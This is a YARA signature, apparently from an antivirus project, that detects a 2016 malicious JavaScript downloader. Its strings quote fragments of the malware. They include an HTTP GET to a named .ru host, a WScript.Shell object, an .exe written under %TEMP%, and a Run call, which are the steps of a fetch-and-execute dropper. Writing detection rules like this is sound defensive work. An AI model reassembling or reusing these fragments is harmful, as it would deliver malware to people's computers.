rule sig_20160330_db5416a1a6cf6bbcf55d0ad5d6c47790 {
  meta:
    description = "datamaliciousorder - file 20160330_db5416a1a6cf6bbcf55d0ad5d6c47790.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6760f2fb14d042b92fd918b050f255dd01f603a3416ecab115176d858f45d84"

  strings:
    $s1  = "function PA(F0, UQ){J = J * 1; return F0 - UQ;};" fullword ascii
    $s2  = "var Y = function D() {return WScript[QX](\"WScript\"+\".Shell\");}(), NX = 11;" fullword ascii
    $s3  = "T[AY](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s4  = "if (T[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Z(){return X + \"\";};" fullword ascii
    $s6  = "function OV() {return Y[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rRMmMtgyu0vPyr.ex\" + \"e\";};" fullword ascii
    $s7  = "function B() {return ((R0 == true) && (R0 == NJ)) ? 1 : J;};" fullword ascii
    $s8  = "function Q(P){Y[\"Run\"](P, J, J);};" fullword ascii
    $s9  = "function O()" fullword ascii
    $s10 = "}while (VP);" fullword ascii
    $s11 = "return PA(R, WO);" fullword ascii
    $s12 = "var RJ = new this[\"Date\"]();" fullword ascii
    $s13 = "function TJ(){return 22;};" fullword ascii
    $s14 = "function Z0(){return QX;};" fullword ascii
    $s15 = "function DX(H) {var S = (1, 2, 3, 4, 5, H); return S;};" fullword ascii
    $s16 = "R0 = true; " fullword ascii
    $s17 = "var R0 = false;" fullword ascii
    $s18 = "var EF = false;" fullword ascii
    $s19 = "var NJ = false;" fullword ascii
    $s20 = "NJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}